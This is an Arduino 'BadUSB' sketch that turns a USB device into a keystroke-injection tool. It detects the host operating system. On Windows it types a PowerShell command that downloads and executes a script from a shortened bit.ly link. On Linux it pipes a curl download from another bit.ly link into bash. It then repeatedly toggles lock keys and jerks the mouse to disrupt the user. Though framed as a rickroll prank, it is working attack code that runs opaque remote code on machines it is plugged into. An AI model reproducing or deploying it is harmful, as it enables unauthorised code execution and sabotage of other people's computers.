//  +-+-+-+-+-+-+-+-+-+-+
//  |L|y|n|-|B|a|D|u|S|b|
//  +-+-+-+-+-+-+-+-+-+-+
//     +-+-+-+-+-+-+
//     |J|D|L|-|8|4|
//     +-+-+-+-+-+-+

#include <Keyboard.h>
#include <Mouse.h>
#include "FingerprintUSBHost.h"
//https://github.com/keyboardio/FingerprintUSBHost

const int _delay = 45; 
const int _initialdelay = 10000;
const int _loopWait = 120000;

////////////////////
////SETUP
void setup()
{

  //INITIATE KEYBOARD
      Keyboard.begin();
  //WAIT AFTER KEY INSERTED, BEFORE FIRE
      delay(_initialdelay);
}

////////////////////
////MAIN FUNCTION
void BaDuSb()
{
  //GET OS IDENTITY
  String os;
  FingerprintUSBHost.guessHostOS(os);
  
  if(os == "Windows") 
  {
     //ROLL'EM - PowerShell
       RICKROLL();  
  }
  else if (os == "Linux")
  {
      //Risky, may or may not have a GUI. 
      //So we're either at a terminal, or we need to create one. 
      //Testing on Ubuntu Server and Workstations. CTRL+ALT+T is OK in both, so lets go with that. 
        BASHRICKROLL();
  }

  //WAIT - TEMP FOR LINUX TESTING
  delay(1500);

  //HAVOC
    int x = 0;   //COUNTER 
    int d = 250; //(d)elay; 
    
    do 
    { 
      //TUMBLE KEY LOCKS
      Press("CAPSLOCK");Keyboard.releaseAll();   Press("NUMLOCK"); Keyboard.releaseAll();   Press("SCROLLLOCK"); Keyboard.releaseAll();   
      //Increment X by (d)elay;
      x = x+d;
      //MICK-THE-MOUSE
      Mouse.move(random(5, 5000), random(5, 5000), 0); 
      //WAIT
      delay(d);
      //Release Keys
      Keyboard.releaseAll();  
    } 
    while (x < 120000);     
}
////WORKER LOOP
void loop()
{
   //START
      BaDuSb();
   //WAIT, DO AGAIN
       delay(_loopWait);   
}


////////////////////
//COMBINATIONS
void RUNCOMMAND() { Press("GUI");  Press("r");  Keyboard.releaseAll(); }
void LINUXTERMINAL() { Press("CTRL");  Press("ALT");  Press("t"); Keyboard.releaseAll(); }

////OBNOXIOUS ALERT
void RICKROLL() 
  { 
      //From http://www.leeholmes.com/
      RUNCOMMAND(); 
      delay(1000); 
      Keyboard.print("powershell.exe -Command ""iex (New-Object Net.WebClient).DownloadString('https://bit.ly/3n8DTGj')""");  
      delay(_delay); 
      Press("ENTER");  
      Keyboard.releaseAll();  
  }


void BASHRICKROLL() 
  { 
    //From https://github.com/keroserene/rickrollrc
    LINUXTERMINAL(); 
    delay(1500); 
    Keyboard.print("curl -s -L https://bit.ly/386ivNn "); 
      //Arduino Pipe Issue 
      Press("PIPE");    Keyboard.releaseAll();
    Keyboard.print(" bash");  
    Press("ENTER");  
    Keyboard.releaseAll();     
   }
////////////////////
//SHORTCUTS
void Press(String b){
  if(b.length() == 1) Keyboard.press(char(b[0]));
  else if (b.equals("ENTER")) Keyboard.press(KEY_RETURN);  
  else if (b.equals("GUI") || b.equals("START")) Keyboard.press(KEY_LEFT_GUI);
  else if (b.equals("CTRL")) Keyboard.press(KEY_LEFT_CTRL);
  else if (b.equals("ALT")) Keyboard.press(KEY_LEFT_ALT);
  else if (b.equals("CAPSLOCK")) Keyboard.press(KEY_CAPS_LOCK);
  else if (b.equals("NUMLOCK")) Keyboard.press(219);
  else if (b.equals("SCROLLLOCK")) Keyboard.press(207);
  else if (b.equals("PIPE")) {Keyboard.press(KEY_LEFT_SHIFT);Keyboard.press(0xec);}

   
}

///////////////////
